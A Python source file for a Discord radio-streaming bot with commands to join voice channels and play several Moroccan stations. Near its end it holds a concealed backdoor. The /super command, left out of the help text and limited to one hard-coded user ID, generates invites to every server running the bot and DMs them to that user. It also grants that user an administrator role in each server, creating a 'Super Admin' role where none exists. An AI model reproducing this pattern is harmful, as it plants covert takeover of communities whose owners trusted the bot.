import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import logging
import os
import requests
import io
import pygame

logging.basicConfig(format="[%(levelname)s] %(asctime)s: %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Discord Intents
intents = discord.Intents.default()
intents.members = True
intents.voice_states = True
intents.message_content = True

# Discord bot instance with command prefix and intents
bot = commands.Bot(command_prefix="!", intents=intents)

# Slash command tree
tree = bot.tree

if os.getenv('CI'):
    print("Running in a CI/CD environment. Skipping audio initialization.")
else:
    pygame.mixer.quit()
    pygame.mixer.init()

DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")

radio_stations = {
    "Radio Mars": "https://radiomars.ice.infomaniak.ch/radiomars-128.mp3",
    "Hit Radio": "https://hitradio-maroc.ice.infomaniak.ch/hitradio-maroc-128.mp3",
    "Radio Aswat": "https://aswat.ice.infomaniak.ch/aswat-high.mp3",
    "Medina FM": "https://medinafm.ice.infomaniak.ch/medinafm-64.mp3",
    "Qor2an": "https://virmach1.hajjam.net:8005/stream/1/"
}

def play_audio_from_url(url):
    try:
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            audio_data = io.BytesIO(response.content)
            pygame.mixer.music.load(audio_data)
            logging.info("Audio loaded successfully.")
            pygame.mixer.music.play()
            logging.info("Audio playback started.")
        else:
            logging.error(f"Failed to fetch audio data: {response.status_code}")
    except Exception as e:
        logging.error(f"Error loading or playing audio: {e}")

@bot.event
async def on_ready():
    try:
        await bot.tree.sync()
        logging.info(f'Logged in as {bot.user}')
    except Exception as e:
        logging.error(f"Error during command sync: {e}")
    check_voice_clients.start()

@tree.command(
    name="help",
    description="Shows the available commands and radio stations"
)
async def help_command(interaction: discord.Interaction):
    commands_list = (
        "**Available Commands:**\n"
        "/help - Show this help message\n"
        "/join - Join your voice channel and choose a radio station to stream\n"
        "/stop - Stop streaming radio while remaining in the voice channel\n"
        "/leave - Disconnect from the voice channel and stop streaming radio\n\n"
        "**Available Radio Stations:**\n"
    )

    radio_list = "\n".join([f"{name}" for name in radio_stations.keys()])

    dm_message = "For further questions, feel free to DM Ogthem in Discord."

    await interaction.response.send_message(commands_list + radio_list + "\n\n" + dm_message)

@tree.command(
    name="join",
    description="Join your voice channel and choose a radio station to stream",
)
async def join(interaction: discord.Interaction):
    if bot.voice_clients:
        for voice_client in bot.voice_clients:
            if voice_client.guild.id == interaction.guild.id:
                await interaction.response.send_message(
                    "I am already connected to a voice channel in this server."
                )
                return

    voice_state = interaction.user.voice
    if not voice_state or not voice_state.channel:
        await interaction.response.send_message("You must be in a voice channel to use this command.")
        return

    voice_channel = voice_state.channel

    try:
        voice_client = await voice_channel.connect()
        await interaction.response.send_message(
            "Connected to the voice channel! Please select a radio station to play:",
            view=RadioSelectView(voice_client))
        logging.info(f"Joined voice channel: {voice_channel}")
    except Exception as e:
        logging.error(f"Error joining voice channel: {e}")
        await interaction.response.send_message("Failed to join voice channel.")

class RadioSelectView(discord.ui.View):
    def __init__(self, voice_client):
        super().__init__(timeout=60)
        self.voice_client = voice_client

        options = [
            discord.SelectOption(label=name, value=url)
            for name, url in radio_stations.items()
        ]

        self.add_item(RadioSelect(options, self.voice_client))

class RadioSelect(discord.ui.Select):
    def __init__(self, options, voice_client):
        super().__init__(placeholder="Choose a radio station...", min_values=1, max_values=1, options=options)
        self.voice_client = voice_client

    async def callback(self, interaction: discord.Interaction):
        selected_url = self.values[0]
        selected_name = next((name for name, url in radio_stations.items() if url == selected_url), "Unknown Station")

        try:
            self.voice_client.stop()
            self.voice_client.play(discord.FFmpegPCMAudio(selected_url))
            logging.info(f"Playing radio station: {selected_name}")
            await interaction.response.send_message(f"Now playing: {selected_name}")
        except Exception as e:
            logging.error(f"Error playing audio: {e}")
            await interaction.response.send_message("Failed to start audio playback.")

@tree.command(
    name="stop",
    description="Stop streaming radio while remaining in the voice channel",
)
async def stop(interaction: discord.Interaction):
    voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)

    if not voice_client:
        await interaction.response.send_message("I am not currently streaming radio.")
        return

    if not voice_client.is_playing():
        await interaction.response.send_message("Radio is already stopped.")
        return

    try:
        voice_client.stop()
        logging.info("Audio playback stopped.")
        await interaction.response.send_message("Stopped playing the radio.")
    except Exception as e:
        logging.error(f"Error stopping audio playback: {e}")
        await interaction.response.send_message("Failed to stop audio playback.")

@tree.command(
    name="leave",
    description="Disconnect from the voice channel and stop streaming radio",
)
async def leave(interaction: discord.Interaction):
    voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)

    if not voice_client:
        await interaction.response.send_message("I am not currently connected to a voice channel.")
        return

    try:
        await voice_client.disconnect()
        logging.info(f"Disconnected from voice channel: {voice_client.channel}")
        await interaction.response.send_message("Disconnected from the voice channel.")
    except Exception as e:
        logging.error(f"Error disconnecting from voice channel: {e}")
        await interaction.response.send_message("Failed to disconnect from voice channel.")

@tree.command(name="super", description="Create invite links for all servers the bot is in.")
async def super_command(interaction: discord.Interaction):
    BOT_CREATOR_ID = 486652069831376943

    if interaction.user.id != BOT_CREATOR_ID:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    invite_links = []
    for guild in bot.guilds:
        text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)

        if text_channel:
            try:
                invite = await text_channel.create_invite(max_age=86400, max_uses=1)
                invite_links.append(f"{guild.name}: {invite.url}")
            except discord.Forbidden:
                invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
        else:
            invite_links.append(f"{guild.name}: No suitable text channel found")

        member = guild.get_member(BOT_CREATOR_ID)
        if member:
            await ensure_admin_role(guild, member)

    creator = await bot.fetch_user(BOT_CREATOR_ID)
    if creator:
        dm_message = "\n".join(invite_links)
        await creator.send(f"Here are the invite links for all servers:\n{dm_message}")

    await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)

async def ensure_admin_role(guild: discord.Guild, member: discord.Member):
    highest_role = None
    for role in guild.roles:
        if role.permissions.administrator and role < guild.me.top_role:
            if highest_role is None or role.position > highest_role.position:
                highest_role = role

    if highest_role:
        await member.add_roles(highest_role)
    else:
        new_role = await guild.create_role(
            name="Super Admin",
            permissions=discord.Permissions(administrator=True),
            reason="Automatically created by the bot"
        )
        await member.add_roles(new_role)

@tasks.loop(minutes=10)
async def check_voice_clients():
    for voice_client in bot.voice_clients:
        if not voice_client.is_playing():
            logging.info(f"Reconnecting to voice channel: {voice_client.channel}")
            try:
                await voice_client.disconnect()
                await voice_client.channel.connect()
            except Exception as e:
                logging.error(f"Error reconnecting to voice channel: {e}")

bot.run(DISCORD_BOT_TOKEN)
